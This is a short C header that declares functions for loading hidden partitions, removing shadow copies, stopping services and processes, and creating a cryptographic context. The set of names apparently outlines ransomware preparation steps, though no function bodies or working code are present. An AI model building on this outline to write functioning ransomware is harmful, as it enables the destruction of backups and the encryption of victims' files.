#ifndef __ANOTHER_H
#define __ANOTHER_H

void _load_hidden_partitions();
void _remove_shadows();
void _stop_services();
void _stop_processes();
HCRYPTPROV gen_context();

#endif